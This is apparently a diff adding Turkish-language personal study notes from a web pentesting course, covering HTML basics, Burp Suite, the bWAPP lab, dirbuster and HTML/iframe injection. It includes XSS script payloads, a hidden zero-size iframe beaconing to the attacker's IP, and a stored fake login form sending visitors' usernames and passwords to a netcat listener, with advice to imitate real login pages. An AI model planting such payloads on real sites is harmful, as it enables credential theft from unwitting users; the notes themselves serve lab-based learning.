@@ -1,0 +1,1309 @@
+bug bounty = hata ödülü bug böcek demek ilk bilgisayar hatası bir böcek yüzünden oluştuğu için ismini buradan alıyor 
+bounty = cömertlik prim ödül hediye armağan
+bee box = arı kutusu 
+juice shop = meyve suyu dükkanı 
+virtualbox = sanal kutu 
+
+    kali linux u sanal makine ile yüklerken ağ olarak nat networkun seçilmesi gerekiyor başta direk olarak kablosuz ağ seçilirse bazı sorunlar meydana gelebilir 
+    dpkg-reconfigure kali-grant-root komutu şifre sormadan root a geçmeyi sağlayan bir komuttur bunu yazdıktan sonra çıkan seçenekler içinde en üstteki olan enable password-less privilege escalation
+    seçeneğini yani şifresiz yetki yükseltmeyi etkinleştir seçeneğine tıklıyoruz 
+    bu işlemin etkin hale gelmesi için restart atmamız gerekiyor sanal makinemize 
+    exit komutu root kullanıcısından çıkıp varsayılan kullanıcımıza dönmeye yarayan komuttur
+    sanal makinenei başarıyla çalıştırmak veya kurmak için BIOS dan sanallaştırma virtualization ı etkinleştirmemiz lazım 
+    kullanıcılarla alakalı karmaşıklığı gidermek için biz genelde root la kullanmayı tercih ediyoruz ama tabii ki avantajları ve dezavantajları mevcut 
+    kaliyi iso dosyası şeklinde indirip kurduğumuzda sanal makineyi isimlendirirken username@hostname şeklinde isimlendirilecektir 
+    sudo su root kullanıcısına geçmek için kullanılan komuttur 
+    kalideki sol üstteki kısayol simgelerinin bulunduğu yere favorite bars denir 
+    web sitesi bir hosting yani sunucu üzerinde saklanır 
+    ifconfig yazdıktan sonra çıkan output daki 2. satırdaki inet satırındaki değer bizim local ip adresimizdir 
+    sunucular da bir bilgisayardır 
+    tarayıcıda herhangi bir websitesine girip sağ tık yapıp sayfa kaynağını görüntüle dersek o web sitesinin html kodlarını kaynk kodlarını görürüz 
+    sağ tık yapıp öğeyi incele derken de görsel olarak var olan bütün parçaların hangi koda karşılık geldiğini görebiliriz 
+    nano html101.html yazarsak bir html dosyayı oluşturur ve terminalde açıp düzenlememize izin verir 
+    apt-get install geany yazarsak geany text editörünü yüklemiş oluruz html öğrenmek için kullanacağız 
+    ve geany yazarak terminale geany i çalıştırabiliyoruz
+    ctrl+shift+t yaparak yeni bir terminal sekmesi açabiliriz 
+    apt-get install gedit yazarak da farklı bir editör olan gedit i yükleyebiliriz çalıştırmak için de gedit yazıyoruz terminale 
+    gedit index.html dersek index.html isimli bir dosya oluşturur 
+    html kodları genelde <!DOCTYPE html> şeklinde başlar 
+    < > bu işaretlere tag yani etiket denir bunların içerisinde yazmak istediğimiz kodları yazarız
+    <!DOCTYPE html> html in hangi versiyonunu yazdığımız kod olarak html i yazdığımızı belirttiğimiz bir işaret bir tagdir 
+    bu tarayıcıya html kodu yazdığımızı belirtmeye yarar 
+    bu etiketler bizim websitemizi gruplandırmamıza ve hangi grubun 
+    head etiketinin içine genelde sitede görsel olarak görülmeyen meta data dediğimiz verileri yazarız 
+    örneğin charset ile hangi karakter setini kullanacağımızı belirtiriz head in içine 
+    title etiketinin içerisindekiler de başlığı tanımlar 
+    title etiketi sekmenin adının gözüktüğü yeri tanımlar bir nevi sitenin başlığını tanımlar ve sekme de sekmenin ismini sitenin başlığını görüntüler
+ctrl+r ile web sayfası yenilenir 
+body etiketinin içine de gerçeken sitede görünen öğelerin tanımlaması yapılır 
+html de yorum yani kod yazmadan bir satır hakkında veya herhangi bir bilgiyi not almak istediğimiz zaman <!-- yorum yazılacak şey --> yapabiliriz bu yorum satırı sitede gözükmez 
+bazen html kodu daha okunur olsun diye her satırın başına belli bir girdi ayarlamak için tab a basılır bunu yapmamız sitedeki herhangi bir görseli değiştirmez 
+etiketlerin arasına yazılan bütün her şey o ilgili etiketi ilgilendirir diğerlerini etkilemez 
+html deki elemanlardan biri <h1> </h1> dir bu bir başlıktır en büyük punto ile yazılan en önemli başlık sıralamasındadır sayılar arttıkça punto azalır önem derecesi de azalır 
+h1 body etiketinin içine yazılır /arasına yazılır 
+bunun gibi 6 tane başlık vardır 
+element = eleman 
+attribute = özellik yani yukarıdaki elemanların detay özellikleri 
+<br> "brake anlamına gelir yani bir satır atlar bu kod buna yarar 
+br de body etiketinin arasına yazılır 
+<br> etiketinin kapanış etiketi yoktur direk olarak bu şekilde kullanılır 
+attribute a örnek olarak örneğin <h1 class "mycss" 
+css html in içerisinde styling vs yapmamıza yardımcı olan bir gösterim dilidir 
+css ile yazılarımızın fontunu rengini gibi özelliklerini atayabiliyoruz 
+html tek başına websitesi yaparken yeterli olmaz 
+class "mycss" yaptığımızda bir sınıf oluştururuz myss e atadığımız özellikleri daha sonra kullanmak istediğimiz bir yazı içerisisinde uygulamak için kolaylık olsun ve baştan yazmama
+k için 
+html de sadece class özelliği değil başka bir çok güvenlik zaafiyetine sebep olabilecek bazı özellikler değiştirilebilir bunu ilerleyen derslerde öğreneceğiz 
+sadece başlık yani /title yazmıyoruz html de aynı zamanda uzun düz yazılar da yazabiliriz bunlara da paragraf denir 
+h1/2/^genelde bunlara "heading" başlıklama denir 
+paragraph için de <p> </p> etiketi kullanılır 
+<strong> xxx </strong> etiketi arasına yazılan yazılar kalın yazılır 
+<em> xxxx </em> etiketi arasına yazılan yazılar italik yani eğik gösterilir (emphasized) vurgulanmış anlamına gelir 
+Anchor Tag 
+<a> </a> bu etiket genelde linklerde karşımıza çıkar 
+ <a href= "https://www.atilsamancioglu.com">mylink</a> yazarak sayfamızda mylink isimli bir tıklanabilir bölge oluştururuz bu bölgeye tıkladığımızda burası bizi 
+ atıl samancıoğlunun websitesine yönlendirir 
+ ama aynı sayfa içerisinde açtı bu linki mevcut sayfamızı koruyarak yeni bir sekmede açması için <a target='_blank' ifadesini yazmamış lazım başına diğer kısmı üstteki ile aynı 
+html de pentest konusunda en çok karşımıza çıkacak öğeler formlar 
+formlar ile biz kullanıcıdan bazı girdiler yani 'input'lar alırız 
+mesela kullanıcının adı,şifresi gibi 
+ve bu formlarda farklı farklı özellikleri ve girdileri değiştirerek farklı sonuçlar ve bilgiler alabiliriz 
+<form> </form> yazarak formlar ile çalışmaya başlayabiliriz 
+<div>  </div> etiketi sayfa içerisinde oluşturacağımız bölgelerin parça parça ve anlamsal olara kbirbirinden ayrılmasını aynı alandaki öğelerin aynı grupta toplamamızı sağlayan
+bir etikettir 
+tek başına bir olayı yok farklı elemanları gruplamamıza olanak sağlıyor 
+örneğin google ın anasayfasında pek çok div var bu divler kendi içerisinde pek çok farklı elemanı barındırıyor 
+ve bu şekilde biraz daha yapısal yazabiliyoruz html kodlarımızı 
+body etiketinin arasına bir adet div ve onun da arasına bir adet label etiketi açıyoruz
+label etiketi içinde küçük bir text barındıran küçük bir metin barındıran yerlerde kullanılır 
+sadece html de değil pek çok programlama dilinde manası budur 
+yine aynı div etiketimizin arasına <input> etiketi açıyoruz bu etiketin bir kapanma etiketi yok 
+bu etiketi kullanırken mutlaka attribute larını vermemiz gerekiyor 
+örneğin tipini / <input type="text" örneğin burada inputun tipini en çok kullanılanlardan bir tanesi olarak text olarak seçtik 
+ardından name="username" yani bu inputa kullanıcılar kullanıcı adlarını girsinler bu inputun amacı bu olsun diye böyle yazıyoruz 
+ardından da placeholder="username"> yazıp tagi kapatıyoruz placeholder özelliği de kullanıcılar bu inputa girdi girmeden imleç ile üzerine tıklamadan önce 
+default olarak gözükmesini istediğimiz yazıyı belirlediğimiz bir özelliktir böylece kullanıcı hangi inputa hangi veriyi girmesi gerektiğini anlayacaktır 
+son olarak tamamı bu şekilde bir kod yazmış oluruz 
+   <form>
+<div>
+<label>User Name</label>
+<input type="text" name="username" placeholder="username">
+
+</div>
+imleci üzerine tıkladığımızda username durmaya devam ediyor ancak bir şey yazmaya başladığımız zaman kayboluyor 
+<br> etiketi ile istediğimiz yere boşluklar oluşturabiliriz daha düzgün gözükmesi için görsel olarak 
+html input type "password" özelliğini bize sunuyor type ı password olarak belirleyebiliriz 
+şimdi username için yaptığımız gibi aynen bir tane de password için bir input oluşturuyoruz 
+<div>
+    <label>Password</label>
+    <input type="password" name="password" placeholder="password">
+    
+    </div>
+    o da bu şekilde 
+    password inputuna firdiğimiz bilgiler şifreli ***** şeklinde gözükür attribute yi password seçtiğimiz için oraya bir şifre girdiğimizi anlar 
+    mesela pentestteyiz önümüzde böyle bir şifre duruyor ama şifreyi göremiyoruz çünkü gizlenmiş **** işaretleriyle bunu nasıl görebiliriz 
+    sayfada sağ tık yapıp öğeyi denetle yapıyoruz veya /incele
+    çıkan penceredeki elements bölümünden form etiketini buluyoruz şifremiz 2. div de olduğu için bu divinolduğu detayları görüntülüyoruz 
+    orada görüyoruz ki 2. divimizin input u = "password" buraya çift tıklayıp type ını password den "text" yapıyoruz ve şifremiz gözüküyor 
+    formlarla işimiz bitti ancak göstermek istediğimiz soon bir şey var bu da text area  özelliği bazen kullanıcılardan alacağımız girdiler daha uzun olabilir yani 
+    username şifre gib isınırlı değil daha fazla içeriğe sahip metinler bu gibi durumlarda text area özelliğini kullanabiliriz
+    text area input gibi ama daah büyük içerikleri tutan ve çoğu zaman boyutu ayarlanabilen bir elemandır 
+    kodumuzun son hali bu şekildedir 
+    <div>
+
+<label> Text Area</label>
+
+<textarea name = "textarea">text text text text </textarea>
+</div>
+formmlarla işimiz bitti şimdi formun dışına çıkalım ve html de en çok kullanılan öğelerden biri oln görselleri öğrenelim 
+<img> yazarak kullanılırlar kapatma etiketi yoktur 
+bazı attribute ları var width (uzunluk) ve height (genişlik) lerini px (pixel) cinsinden belirleriz 
+örneğin <img width="200px" height="300px" eğer bir değer atamazsak hangi görseli koyduysak onun orijinal boyutlarını esas alır 
+bu genişlik ve uzunluğunu vermek zorunda değiliz vermemiz gereken asıl bilgi src (source) yani resmimizin kaynağıdır 
+bazen bu kaynağı websitemizin içerisinde bulundurduğumuz bir resimden dosya yolu ve site içi bağlantı olarak da verebiliriz local bilgisayaımıza indirdiysek 
+oradan da konumunu yazarak yükleyebiliriz ya da internette public olarak paylaşılan bir dosyanın konumunu da kopyalayıp yapıştırabiliriz source olarak 
+<button> <(button> lar da üstüne tıkladığımız kutucuklar/nesneler)
+bazen websitelerde öğeyi denetle dediğimiz zaman footer ve header etiketlerini görürüz bu derste bunların ne işe yaradığını öğreneceğiz
+sitelerin en alt kısmında bazen privacy (gizlilik sözleşmelerinin) blog,basın,İş ortaklarımız,SSS,Copyright gibi bölümlerin bulunduğu nesnelere footer denilir 
+footer body etiketinin içinde yazılır  <footer> </footer>
+header etiketi de daha çok ana başlıkların gruplanarak daha yapısal biir şekilde ayrılmasını sağlayan bir etikettir <header> </header> 
+bu dersimizde web açıklarını test edebileceğimiz "beebox" isimli bir sanal makine indireceğiz 
+sourceforce isimli sitedeki 1.3 gb lık dosyayı indirmemiz gerekiyor 
+beebox ı kurmak için virtual box ımızdan yeni seçeneğinden yeni bir sanal makine oluşturacağız 
+türü olarak linux u seçiyoruz 
+sürüm ubuntu 64 bit seçiyoruz 
+kaliyle aynı anda açacağımız için ramini 1 gb vermek yeterli 
+bir sonraki pencerede açılan sçeeneklerden en alttakini seçip beebox ın kurulum dosyalarından beebox vmdk i seçiyoruz 
+yükledikten sonra kali hangi ağdaysa bunu da o ağda olacak şekilde ayarlıyoruz ayarlardan 
+beebox makinesine gidip setxkbmap tr yapıp klavyeyi tükrçe yapıyoruz 
+beebox ile kali aynı ağda olduktan sonra kaliden tarayıcı adres çubuğuna 10.0.2.9 yazarak bwapp a ulaşabiliriz 
+siteye eriştikten sonra gelem seçeneklerden en üstteki bwapp i seçiyoruz açılan yeni syfada kullanıcı adı ve şifre yazılı olacak onları giriyorum ve zorluk/güvenlik seviyesini ayarlıyoruz (low yap)
+bu site web açıklarını pratik etmemizi sağlayan bir site sağ üstte choose your bugs seçeneğinden oratik etmek istediğimiz zaafiyeti seçebiliriz 
+burpsuit i açıyoruz güncelleme varsa update now dan güncellenecek dosyayı indirmek için sayfaya yönlendiriliyoruz download the latest version dan > açılan sayfadan tekrar dowload diyip dosyayı save diyerek kayediyoruz 
+inen sh uzantılı dosyayı bash dosyaismi şeklinde çalıştırıyoruz programlardan burp community edition ı seçiyoruz farklı bir ikonla yeniden yüklenmiş olabilir eskisini açmamaktan fayda var 
+bu ücretsiz sürümü olduğu için temporary yani geçici project proje next diyip start burp diyoruz
+burpsuit bir proxy aracıdır bizim internette yaptığımız bütün işlemler internette gezinmek linkleri açmak request leri almak vs burpsuit üstünden gidecek 
+bunu yaptığımızda da burpsuitte bütün request ve response ları alabilir hale geleceğiz burpsuit de bütün request ve responsları yani istekleri ve cevapları alabilir hale geleceğiz ve böylece bu istekleri ve cevapları 
+analiz edip gerektiğinde değiştirip gerektiğinde teslere tabi tutup gerektiğinde saldırılara tabii tutup ihtiyacımızı giderebileceğiz 
+burpsuit websitesinin nasıl çalıştığını anlamak için de çok faydalı burpsuit programının proxy>options bölümünden hemen alttaki bölmede 127.0.0.1 8080 değerinin kutucğunun işaretli olması gerekiyor 
+eğer burada hiç bir şey gözükmüyorsa hemen solundaki add butonuna basıp bind to port kısmını 8080 yapıp bind to address i loopback only yapıyoruz bu penceredeki request handling bölümünde hiç bir değer girilmiyor 
+certificate bölümünde ise certificate ca-signed per-host certificates kısmının seçili olduğuna emin oluyoruz bu işlemler lokalde bir proxy çalıştırmamıza yarıyor 
+sağ ctrl ile beebox da host makineme dönebilirim basılı tut sonra işkem yap 
+bu proxy ayarlamayı firefox da da yapmamız gerkiyor o yüzden kalide firefox u açıp sağ üstteki options a girip preferences e tıklıyoruz > privacy and security e tıklıyoruz aradığımız özellik network bazen güncelle 
+melerde dğiştirilebiliyor yerleri o yüzden preferences i açtığımızda direk yukarda arama yerine network yazıyoruz 
+çıkan sonucun settings bölümünden ayarlarına giriyoruz çıkan pencereden manuel proxy configuration a tıklıyoruz http bölümüne 127.0.0.1 port kısmına 8080 yazıyoruz 
+Also use this proxy for FTP and HTTPS kısmını işaretliyoruz
+no proxy for kısmında eğer bir site yazıyorsa bunlrı siliyoruz ardından okay e basıyoruz bunu sadece burp kullanırken yapmamız gerekiyor harici kullanımlarda use system proxy settings e tıklıyoruz 
+burpsuit de proxy kısmında intercept kısmında incercet is on olacak default ona tıklayıp intercepr is off yapıyoruz 
+intercept araya gir engelle demek eğer bbunu on yaparsak bizim yolladığımız hiç bir istek çalışmayacaktır 
+son olarak da tarayıcımıza sertfika yüklememiz gerekebilir burp un doğru çalışması için https://portswigger.net/burp/documentation/desktop/getting-started/proxy-setup/certificate/firefox bu drese gidiyoruz 
+burpsuit i çalıştırdıktan sonra tarayıcımızın adres çubuğuna http://burp/ yazıyoruz sağdaki  CA Certificate kısmına basıp sertfikayı indiriyoruz 
+firefox options>preferences>privacy and security>View Certificates…(en aşağıda)>import>cacert.der>this certificate can identify websites.
+bu dersimizde html enjeksiyonunu öğreneceğiz beebox da html injection reflected (get) i seçiyoruz normalde bu enjeksiyon için burpsuit kullanmaya gerek yok ama biz pratik etmek için kullanacağız 
+burpsuit>proxy>intercept on yapıyoruz artık internet trafiğinden gelen paketleri engelleyecek burpsuit  // bwapp de firstname ve last name yazdıktan sonra go diyince bizi direkt olarak burpsuit penceresine 
+atar çünkü biz paketleri yakalama özelliğini intecept özelliğini on yaptık ve o sitede bir aksiyon olmadı yani girdiğimiz inputlar karşı tarafa iletilmeden önce burpsuit tarafından yakalandı 
+bizi attığı pencere proxy>intercept karşımıza gelen çıktıda ilk satırda GET diye bir ifade görüyoruz // Sunucularda bir kaç adet istek çeşidi vardır GET (Almak POST (Postlamak yani herhangi bir veriyi yazmaya çalışmak))
+UPDATE (Güncellemek)  DELETE (Silmek gibi) get genelde bir sonuç almak için yolladığımız bir istektir post genelde sunucuya bir şey yazmak için veritabanına bir şey kaydetmek için vs 
+get satırında hangi adrese gidildiğini first name ve last name in ne olduğunu görebiliyoruz burpsuit den mevcut sekmede forward =ileri larsam bu istek siteye gönderilecek ve sitede welcome atil sam yazaxak
+get satırında gönderilen isteği tam olarak açık ve şifrelenmemiş bir şekilde görüntüleyebiliyoruz
+bazen bwapp de adres çubuğunda get isteği gözükmeyebilir veya cevap da çıkmayabilir ama bunu burpsuit de yakalayabiliyoruz programdaki target> site map bölümünde görebiliriz 
+htmlı.get.php kısmının içindeki firstname ile başlayan satırda 
+örneğin burada first ve last name kısımlarına sırasıyla Atıl Sam yazdığımızda aşağıda Welcome Atıl Sam çıktısını verir 
+ancak first name e <h1> Atıl </h1> last name e de Sam yazarsak Atıl ı h1 içine yazdığımız için bunu tarayıcıda Heading olarak algılayıp Heading Şeklinde yazdıracaktır demekki biz burada html çalıştırabiliyormuşuz 
+bu her zaman h1 içerisinde yazıldığı gibi zararsız olmayabilir bazen bu inputların içine daha tehlikeli kodlar yazılavbilir enjekte edilebilir 
+örneğin html injection cheat sheet github yazarak bu güne kadar tespit edilmiş html enjeksiyonlarını xss gibi daha farklı zaafiyetlere sebep olan kodların görüntüleyebiliriz 
+örneğin html injection cheat sheet github bu linkteki <h1>Hello,<script>alert(1)</script>!</h1> kodunu ele alalım bu kodda h1 başlığının içine Hello yazdırılmış ve script tagi ile (bu javascript kodudur)
+bir kod çalıştırılacağını belirtmiş ardından da alert özelliğini kullanarak bir uyarı mesajı oluşturulmaya çalışılmış eğer bu uyarı mesajı çalıştırılabilirse o sitede pek çok işlem yapılabilir kullanıcıların tarayıcılarında 
+ başka herhangi bir javascript kodu da çalıştırılabilir js kodu çalıştırabilmek de kullanıcının browserında pek çok şeyi yapabilmek demektir örneğin cookielerini çalmaya çalışabiliriz 
+ beef saldırısı yapılabilir bu kodu bwapp de çalıştırdığımızda ekrana 1 çıktısı veren bir uyarı mesajı gelir bu da kodun doğru bir şekilde çalıştırılmış olduğunu gösterir 
+ <h1>Hello,<script>alert("Hacked")</script>!</h1> yazarak içeriğini de düzenleyebiliriz böylece bu sefer ekrana gelen uyarı mesajında Hacked yazacaktır 
+ Bu dersimizde gördüğümüz "Reflected" yalnızca bir defaya mahsus olarak yazdırabildiğimiz bir enjeksiyon çeşididir bir de Stored var o açık siteye kaydedilip artık o sitenin zaafiyeti bulundurduğu bölümüne giren 
+ herkesin karşılaşacağı bir açık oluyor onu da diğer dersimizde göreceğiz Reflected da ancak zaafiyeti kendimiz oluşturup bu linki hedef kişiye yollarsak çalışabilir siteyi yenilediğimiz zaman o ana has olduğu için 
+ sitemiz tekrar eski haline dönecektir 
+ bu derste stored enjeksiyonunu öğreneceğimm
+ html injection post ile ijection get arasında çok büyük bir fark yok zaten genel olarak ikisinde de zaafiyetler yapılan işlemler ortak oluyor 
+ burpsuit den intercept i on yapıyoruz açıyoruz 
+ bwapp firstname last name kısmına atil sam yazıyoruz submit ediyoruz brupsuit e geri dönüyoruz proxy>interceprt kısmında birinci satırda isteğimizin POST Request olduğunu görüyoruz 
+ get request genelde bir bilgi almak için post request de bir veriyi siteye kaydetmek için kullanılır 
+ fakat bazı durumlarda ikisi de kullanılabilir bir işlemde daha sonra Forward diyoruz 
+ intercept i kapatıp enjeksiyonumuzu uygulayacağız <h1>Hello,<script>alert(1)</script>!</h1>  yazıyoruz last name e de sam yazıyoruz 
+ submit yaptığımızda çalıştığını görüyoruz 
+ hackerların reflected ı sömürebilmesi kullanabilmesi için bazı şeyler yapması lazım reflected da o anlık bir zaafiyet olduğu sayfa yenilendiği zaman kaybolduğu için saldırganın bunu kullanması için zaafiyetin 
+ çalıştığı linki bir kurbana atması gerekiyor örneğin bir link kısaltıcı ile bu linki kısaltıp kurbana sosyal mühendislik numarası ile atabilir 
+ bitly gibi siteler ile 
+ stored enjection da saldırganın buna ihtiyacı yok çünkü zaafiyet direk olarak siteye kaydedildiği için daha tehlikeli ve ödül bakımından da daha değerlidir 
+ sağ üstten seçtiğimizde çıkan örnek blog sayfasında da az önceki <h1> atil </h1> kodunu çalıştırabiliriz böylelikle atil diye bir header oluşturmuş ve bunu siteye kaydetmiş oluruz kaydedilen bu yazıyı 
+ sitenin o sayfasına giren herkes görüntüleyebilir çünkü bi bunu sitenin kendisine kaydetmiş gibi oluruz 
+ aynı şekilde <h1>Hello,<script>alert(1)</script>!</h1>  kodunu da enjekte edebiliriz 
+ peki hackerlar bunu nasık kötüye kullanabilir bunu öğreneceğiz iFrame ile kaydettiğimiz bütün kayıtları delete e basarak silebiliyoruz 
+ iframe html de kullandığımız bir çerçevedir 
+ bu çerçevenin içinde bir görsel göstermek ne gibi bir işimize yarayabilir 
+  <iframe src="https://static.billboard.com/files/2020/05/03-metallica-press-2018-cr-Ross-Halfin-b-billboard-1548-1589834861-compressed.jpg" </iframe> src konumuna yüklemek istediğimiz resmin bağlantı linkini 
+  yapıştırıyoruz sağ tık yapıp copy image location veya resim konumunu kopyala diyebiliriz
+  genişlik ve yükseklik de vereibliriz ama bu uygulamada vermeyeceğiz submit e tıkladığımızda resmimizin bir çerçeve içinde yüklendiğini görürüz 
+  tekrar siliyoruz bu kayıtı da 
+  peki bunu nasıl zararlı bir hale getirebiliriz bunun için  <iframe src="http://local ip adresi:port numarası/test" (port olarak 4545 seçilebilir) boşta olan ve kullanılmayan bir port seçilebilir 
+  çalışmaz ise başka bir port numarası dene
+  portlar bizim bilgisayarımıza giren veya çıkan bilgileri hangi kapıdan girdiğini gösteren numaralardır farklı farklı bilgiler farklı portlardan bilgisayarımıza ulaşır 
+  /test ifadesi /test dizinine gidildiğini gösterir bu sefer height ve width da vereceğiz height="0" width="0"></iframe> yazıyoruz
+  <iframe src="http://local ip adresi:port numarası/test"height="0" width="0"></iframe> tamamı bu olmalı bunu add demeden önce bu işlem bizim bilgisayarımıza bir bilgi yollayacak 
+  bzim de yollanan bu bilgiyi dinlememiz gerekiyor neden dinliyoruz çünkü bilgisayarımıza bir girdi gelecek bu websitesinden dinlemek için natcat isimli bir kali linux aracını kullanacağız 
+terminale nc yazarak açabiliriz ama biz bu şekilde açmayacağız bu araç genelde bilgi alırken işlerken veya bilgi yollarken kullandığımız bir araç biz nc -nvlp 4545 (bu hangi porttan dinleme yapacağımızı belirttiğimiz
+bir komuttur )
+genişlik ve yüksekliği 0 seçmemizdeki amaç şüphe çekmeden enjeksiyonumuzu yapmak ve görsel herhangi bir farkındalık oluşmamasını sağlamak içindir yaptığımız bu enkeksiyon ile bu siteye submit olarak girdi yapan bütün 
+kullanıcıların ip adresleri natcat ile bize düşer 
+bu derste formlarla kullanıcı adı ve şifresi hacklemeyi öğreneceğiz öncelikle kali terminalinde geany yazıyoruz 
+öncelikle bir form tanımlayacağız ve bu form bir giriş yapma formu olacak <form name="login" action="http://10.0.2.4:4545/test.html"> yazarak tanımlayabiliriz 
+buradak kullanılan action attiribute u da kullanıcı forma istediğim bilgileri verdikten sonra nasıl aksiyon alayıp/ ne yapayım devamındaki http://10.0.2.4:4545/test.html ifadesi de bu inputa girilen bilgileri bu 
+ip adresine bu port aracılığı ile yolla anlamına gelir kullanıcıların kullanıcı adı ve şifre girebilmesi için 2 adet form oluşturmamız lazım bunun için de 
+<input type="test" name="username" placeholder="username">
+<input type="password" name="password" placeholder="password"> yazabiliriz <table> </table> etiketi html de tablo oluşturmak için kullanılır 
+verilerimizi daha düzgün bir şekilde göstermek görüntülemek için kullanılır 
+<table>
+<input type="test" name="username" placeholder="username">
+<input type="password" name="password" placeholder="password"> 
+</table> etiketi ile yazdıklarımızı table etiketinin arasına alıyoruz 
+ama bu kodlar tek başına yeterli değil düzgün gözükmesi için bu yüzden tablolarda kullanılan bazı tagleri öğreneceğiz bunun için <tr> </tr> etiketini kullanacağız bu etiket table roll anlamına gelir 
+(oluşturduğumuz tablodaki verilerimizi aynı excel de olduğu gibi sıra sıra bölümler/ayırır) daha sonra tr etiketinin içine bir <td> </td> etiketi tanımlayacağız bu etiket te ayırdığımız bölümün başında 
+hangi stringi göreceğimizi tanımladığımız bölümdür biz bunu Username: olarak tanımlayacağız aynı işlemi aşağıdaki input için de yapıyoruz ona da Password: stringini yazıyoruz 
+son olarak da hemen table etiketinin dışına bir input daha tanımlayacağız bu input da submit butonu olacaktır submit girdiğimiz verilerin hedefe iletilmesini sağlayan bir buton bir formdur 
+<input type="Submit" value="login"> şeklinde yazıyoruz 
+tabii biz birinci form etikeinin olduğu satırda kendi ip miz ne ise onu yazmalıyız 
+
+
+son olarak yazmamız gereken kodların tamamı şu şekildedir 
+
+<!DOCTYPE html>
+    
+<form name="login" action="http://10.0.2.4:4545/test.html">
+    
+<table>
+<tr><td>Username:</td><td><input type="test" name="username" placeholder="username"></td></tr>
+<tr><td>Password:</td><td><input type="password" name="password" placeholder="password"></td></tr>
+</table>
+<input type="Submit" value="login">
+</form>
+
+bu kodlarımızı alıp bwapp in html injection stored (blog) kısmındaki inputa yapıştırıyoruz isteği göndermekten önce netcat i başlatmamız gerekiyor hedef cihazın girdi verilerini izlemek için 
+bunun için de nc -nvlp 4545 tabii bu hazırladığımız görsel çok ham ve sade oldu saldırı yapmak istediğimiz hedefe göre onun official resmi login sayfasına benzetmeye çalışarak daha inandırıcı bir hale getirebiliriz 
+direkt olarak onların html kodunu kopyalayrak da yapabiliriz nc yi çalıştırdıktan sonra bwapp e submit ediyoruz ve stored bir şekilde bu input siteye kaydediliyor 
+artık buraya girdilerini giren herksin bilgileri ilgili ip adresimize düşecektir 
+nc de GET isteği düştüğünü görüyoruz devamında username:xxx ve şifre:xxxx bilgilerinin de düştüğünü görüyoruz nc yi ctrl c ile durdurabiliriz durdurduktan sonra burpsuit is sitesinde bir hata alaibliriz önemli değil 
+
+bu dersimizde dirbuster ın nasıl kullanıldığını öğreneceğiz 
+pek çok web pentesting yapmadan önce dirbuster kullanmalıyız bu tool ile açıklarını aradığımız websitesinin içerisinde hangi sayfaların olduğunu gizli/açık görebiliriz 
+bunu burpsuit den de görebiliriz bwwapp klasörünün içerisinde girdiğimiz girmediğimiz bütün bağlantıları görebiliriz sitemizdeki 
+robot.txt sayfası google ın web sitelerinin içeriklerini yedeklerken veya sınıflandırırken kullandığı robotların websitesindeki hangi sayfalara girip hangilerine giremeyeceğinibn yetkisinin/izninin verildiği dökum
+andır 
+robots.txt den hangi bağlantıların disallowlandığını görüp o sayfalara ulaşıp yetkimiz olmadığı hassas bilgilere erişebiliriz örneğin /passwords/ gibi (bunu da tarayıcının adres çubuğuna yazarak gerçekleştiririz)
+sitelerin haritalandırılmasında dirb ve dirbuster araçalrı ikisi de kullanılabilir 
+dirbuster owasp ın bir aracıdır 
+programa girdiğimizde bizi ilk olarak Target URL diye bir input karşılar bu hangi url nin taranılacağının belirdlendiği kısımdır 
+biz burada bwapp ın lokal ip adresini yazacağız hemen aşağısındaki satırdaki Auto Switch (HEAD AND GET) i işaretliyoruz 
+number of thread burada siteye gönderilecek istek sayısını belirleriz eğer tarayacağımız sitede bir firewall yani güvenlik duvarı cihazı var ise go faster diyerek 200 istek gönderilmesi başarısızlıkla sonuıçlana
+bilir çünkü güvenlik duvarı aynı ip den kısa sür içerisinde bu kadar çok isteği bir tehdit olarak algılayıp bizi siteden blocklayabilir bu yüzden ne kadar az yaparsak o kadar iyi pentestlerde genelde bu sayı az 
+olur işlem yavaş olur ama risk daha aza iner 
+
+hemen aşağısındaki seçeneklerde ise list based brute force seçeneği var bu seçenek siteden çıkarılan bağlantıların username password girdilerine brute force yani kaba kuvvet şifre denemesinde bulunur hazır bir 
+wordlist ile (içinde çeşit çeşit şifrelerin bulunduğu bir dökuman)
+hazır bir wordliste /usr/share/wordlists/ konumundan erişebiliriz
+örneğin /usr/share/wordlists/metasploit/ içinde name.list dosyasında internette sıkça kullanılan kullanıcı adlarını görebiliriz yine /usr/share/wordlists/ fasttrack.txt de en çok kullanılan şifreleri görebiliiriz 
+rockyou.txt.gz de yine aynı şekilde en çok kullanılan şifrelerin barındığı bir txt dosyasıdır 
+/usr/share/wordlists/dirbuster/ biz bu derwste dirbuster klasöründeki dosyalar ile ilgileniyoruz burada da en çok kullanılan directory list 2.3 medium .txt dir 
+dirbuster programına geri dönüp browse diyip bu dosyamızı seçiyoruz seçtikten sonra aşağıda select starting options da brute force dirs / brute force files / standart start point > be recursive in işaretli olduğuna 
+dikkat ediyoruz dir to start with : / şeklinde ve file extension da php olduğuna 
+en aşağıdaki inputta URL ile başlayan / var sağ alttan start diyip başlatıyoruz tarama başladıktan sonra time to finish de taramanın ne kadar süre süreceğini yazıyor ve tarama çıktılarının aktığı beyaz ekranın hemen 
+üstündeki seçeneklerden result da da sonuçları görebiliriz gözle göremediğimiz ve menüden giremediğimiz vs sonuçalrı aldığımızı görebiliriz 
+eğer biz manuel olarak ayarlamazsak default olarak 80 portunu seçecektir http istekleri buradan aktığı için 
+response olarak 200 aldığımız sonuçlar gerçekten bir sonuç aldığımız çıktılar bulunamayan veya sunucu hatası aldığımız response kodlarını da burada görebiliriz 
+results > type > dir (directory = dizin/klasör demek) örneğin 10.0.2.9/evil diye bir sonuç buldu burada bulunan sonuçları bu şekilde dğeiştirerek adres çubuğuna yazıp işimize yarayan bir sonuç bulabiliriz
+**ip uygulamaya göre farklılık gösterebilir** ama biz bu dersimizde iframe injection u öğreneceğiz iframe bir çerçevedir ve içerisinde bazı içerikler görüntülenir 
+buradan bwapp te iframe injection sayfasında sağ tık wiew page source dersek yazıldığı html kodlarını görebiliriz  ctrl+f yapıp iframe kelimesini aratıyoruz bu iframe de robot.txt dosyasının gösterilmesi istendiği
+ni görüyoruz ve iframe injection u seçtiğimizde adres çubuğuna bakarsak da robot.txt nin yazılmış olduğunu görürüz 
+adres çubuğundaki ParamUrl=bWAPP/images olarak değiştirdiğimizde (sadece bu kısmı öncekiler ve sonrakiler aynen kalacak) bir iframe içerisinde (çerçeve) images kısmının görüntülendiğini görüyoruz 
